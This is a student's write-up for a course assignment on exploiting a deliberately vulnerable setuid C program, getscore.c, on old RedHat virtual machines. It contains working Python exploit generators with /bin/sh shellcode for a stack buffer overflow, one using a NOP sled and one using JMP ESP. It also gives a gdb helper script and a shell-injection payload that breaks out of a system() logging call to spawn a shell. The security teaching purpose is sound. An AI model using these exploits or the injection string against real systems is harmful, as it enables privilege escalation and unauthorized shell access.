# Assignment 1. Buffer Overflow Exploit Project

 Develop your own exploit for getscore.c for both Redhat8 and Redhat9. 
 You can either develop one exploit for each platform or a single exploit for both. 
 The RHL8 and RHL9 virtual machines are [here] (https://drive.google.com/drive/folders/0BzkPm4m1AGy4N3Z4TldfNXRudlU)
 The files getscore.c and score.txt are provided.
 Submit the source code of your exploit generator.

Note that these RedHat versions do not have `yum` installed, and therefore, it is not possible to 
install Python 2.7 or better (yes, they have Python 2.2; this made me realize the greatness in 
Python 2.7+). 

And sure, we could have installed `yum` and updated Python, but the professor will run the exploits 
with the original virtual machines that use Python 2.2.


# getscore.c

```C
#include <stdio.h>
#include <time.h>

FILE *scorefile;
int get_score(char *name, char *ssn, char *score);
char* str_prefix(char *prefix, char *str);

int main(int argc, char *argv[])
{
    int ruid, euid;
    char score[128];

    if (argc != 3) {
        printf("Usage: getscore name SSN\n");
        exit(1);
    }

    time_t current_time = time(NULL);

    ruid = getuid ();
    euid = geteuid ();
    // This is to make sure the logging command will have
    // sufficient privilege.
    if (setreuid(euid, euid)){
        perror("setreuid");
    }

    scorefile = fopen("score.txt", "r");
    if (scorefile == NULL){
        printf ("failed to open score file\n");
    }
    else{
        if (get_score(argv[1], argv[2], score)){
            char command[256];
            printf("Invalid user name or SSN.\n");
            sprintf(command, "echo \"%s: Invalid user name or SSN: %s,%s\"|cat >> error.log", 
                    ctime(&current_time), argv[1], argv[2]);
            if (system(command)){
                perror("Logging");
            }
            exit(-1);
        }
        printf("Your score is %s\n", score);
    }
}

int get_score(char *name, char *ssn, char *score)
{
    char matching_pattern[128];
    char line[128];
    char *match_point; 

    strcpy(matching_pattern, name);
    strcat(matching_pattern, ":");
    strcat(matching_pattern, ssn);

    while (fgets(line, 128, scorefile)!=NULL){
        if (match_point=str_prefix(matching_pattern, line)){
            if (*match_point++==':'){
                while (*match_point!=':'){
                    *score++=*match_point++;
                }
                *score=0;
                return 0;
            }
        }
    }

    return -1;
}

char* str_prefix(char *prefix, char *str){
    while (*prefix && *str){
        if (*prefix != *str)
            return NULL;
        prefix++;
        str++;
    }
    return *prefix==0?str:NULL;
}

```

# Exploit for RHL8

Exploit:

```python
#!/usr/bin/python

# exec /bin/sh
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Before starting to overwrite the first byte of $eip, there are 138 bytes

def prep_buffer(addr_buffer):
    buf = "\x90" * 69 # 138/2 = 69; this way, first half of buffer will be NOP
    buf += shellcode # len(shellcode) = 25 
    # 69 + 25 = 94; and before overwriting $eip there are 138 bytes
    # 138 - 94 = 44
    buf += 'A' * 44 # 44 bytes more to fill up the buffer 
    buf += addr_buffer # address that will be put on $eip
    return buf

if __name__ == '__main__':
    addr_buffer = '\xac\xf8\xff\xbf' # $esp - 100
    buf = prep_buffer(addr_buffer)
    print buf
```

Run:
 
```
EGG=`./pythonexploit1.py`
```

Run:

```
./getscore a $EGG
```

### Exploit Explanation

RedHat 8 does not use ASLR by default when compiling with gcc. Therefore, we can
predict were $esp will point to by running it the first time and looking its value
when the user input is read.

Playing with different lengths of inputs, we can see that just before overriding the
first byte of $eip, were are able to fit 138 bytes. The four bytes entered after
those 138 bytes will be stored in $eip.

To exploit this, the 138 bytes will contain the NOP sled, the shellcode, and extra
bytes ("\x41" in this case). We can choose the NOP sled to be half the size of the
buffer (138/2 = 69). Therefore, the first 69 bytes of the buffer are "\x90".

Then, because the shellcode is 25 bytes long, that leaves us with 138 - 69 - 25 = 44
bytes to fill with "\x41" bytes.

Once the buffer is 138 bytes long, we also concatenate the address that we want to be
placed on $eip, which has to point anywhere in the NOP sled. Playing with gdb,
I noticed that 0xbffff8ac was a good candidate. It was the value of $esp - 100.
Therefore, the last four bytes of the exploit are “\xac\xf8\xff\xbf”.


# Exploit for RHL9

Exploit:

```python
#!/usr/bin/env python2

import sys

# exec /bin/sh
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Before starting to overwrite the first byte of $eip, there are 138 bytes

def prep_buffer(addr_buffer):
    buf = 'A' * 138
    buf += addr_buffer
    buf += shellcode
    return buf

if __name__ == '__main__':
        buf = prep_buffer('\xc7\x76\x12\x42')
        # I got the previous address from gold-adresses.txt which is generated 
        # after executing bash-script.sh
        print buf
```

Run:

```
EGG=`./pythonexploit2.py`
```

Run:

```
./getscore a $EGG
```

### Exploit Explanation

RedHat 9 use ASLR by default when compiling with gcc. Therefore, we can't predict
were $esp will point to.

Same as in RHL8, we can fit 138 bytes in the buffer before overriding the first byte of
$eip. The four bytes entered after those 138 bytes will be stored in $eip. And the four
bytes after $eip, will be in $esp.

The plan is to put the address of a JMP ESP instruction in $eip and point $esp to the
shellcode. That way, the program will see that it needs to jump and execute whatever
$esp is pointing to.

The buffer will be filled with 138 "\x41". The following four bytes are “\xc7\x76\x12\x42”,
which is address 0x421276c7 and contains JMP ESP.

And finally, we can concatenate the shellcode to the previous bytes.

To find a JMP ESP address, I wrote the script *bash-script.sh*. One of the files that this
script generates is called *gold-adresses.txt*, and it will have several addresses that
contain said JMP ESP. I chose 0x421276c7 because it worked! So I hardwired it into the
exploit script.

This is the bash script:

```bash
echo "Running... Be patient"
echo "b main" > gdb-commands.txt;
echo "r" >> gdb-commands.txt;
./printSeveralAddresses.py >> gdb-commands.txt;
gdb -batch -x gdb-commands.txt --args ./getscore > instructions.txt;
cat instructions.txt | tr -d " " | tr -d "\t" | grep ':jmp\*%esp' > jmp-esp-instructions.txt;
./findJmpEsp.py;
```


# Other Vulnerability in the Program: a bash injection

When getscore is logging failed attempts in error.log, it does so by executing the
echo command with some arguments such as the name and the SSN that are formatted
into a string.

```C
sprintf(command, "echo \"%s: Invalid user name or SSN: %s,%s\" | cat >> error.log", ctime(&current_time), argv[1], argv[2]);

if (system(command))
    perror("Logging");
```

We can take advantage of this by appending a second command to be executed just
after the echo command; and we know that in Linux, that could be done with a semicolon.

To inject the desired characters into the SSN, we first need to give it a double quote
so that the message to be echoed is finished. To be able to send a double quote, we have
to escape it with a backslash, like: `\"`

Then we are able to place the semicolon that will allow us to execute whatever we want
after the echo.

Because we want a shell, we choose /bin/sh as that command.

Because we already closed the double quotes of the echo message, we have to add a `#`
symbol (a comment in bash) to let bash know that we are not start a new quote.

The bash injection can be executed like this:
```bash
./getscore a "$(printf " \" ; /bin/sh #")"



